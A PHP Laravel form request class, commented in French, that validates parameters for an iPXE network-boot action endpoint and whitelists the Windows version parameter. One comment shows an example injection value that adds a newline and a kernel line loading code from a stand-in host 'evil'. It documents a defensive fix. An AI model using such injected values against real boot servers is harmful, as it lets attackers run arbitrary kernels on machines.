<?php

declare(strict_types=1);

namespace App\Ipxe\Http\Requests;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;

/**
 * Story 3.2 — AC2.2.
 *
 * Validation permissive du body de `GET|POST /ipxe/action/{action}`. Règles
 * iso `IpxeBootRequest` (3.1) + tolérance pour les paramètres optionnels
 * `version`/`debug`/`disk`/`perso` consommés par {@see \App\Ipxe\Services\IpxeActionResolver}.
 *
 * **Note** : le param `action` est dans l'URL (route param) — il n'est PAS
 * dans les rules. La validation est portée par l'enum
 * {@see \App\Ipxe\Enums\IpxeAdminAction} consommé par
 * {@see \App\Ipxe\Services\IpxeService::handleAction()} qui `abort(404)` si
 * la valeur est hors whitelist.
 *
 * `authorize()` retourne `true` — l'auth est portée par le middleware
 * `auth.v1.lan-only` (D3).
 */
class IpxeActionRequest extends FormRequest
{
    public function authorize(): bool
    {
        return true;
    }

    /**
     * @return array<string, array<int, mixed>>
     */
    public function rules(): array
    {
        // Fix review #2 / Q2 Henri — whitelist stricte `Win10|Win11` pour le
        // paramètre `version` consommé par `actions/winpe.blade.php`. Sans
        // whitelist, un input `version="Win11\nkernel http://evil/x"` permet
        // une injection iPXE (le firmware exécute la ligne kernel attaquante).
        // Source de vérité : `config('ipxe.actions.winpe.allowed_versions')`.
        $allowedVersions = (array) config(
            'ipxe.actions.winpe.allowed_versions',
            ['Win10', 'Win11'],
        );

        return [
            'mac' => ['nullable', 'string', 'max:64'],
            'uuid' => ['nullable', 'string', 'max:64'],
            'product' => ['nullable', 'string', 'max:128'],
            'version' => ['nullable', 'string', Rule::in($allowedVersions)],
            'debug' => ['nullable'],
            'disk' => ['nullable'],
            'perso' => ['nullable'],
        ];
    }
}
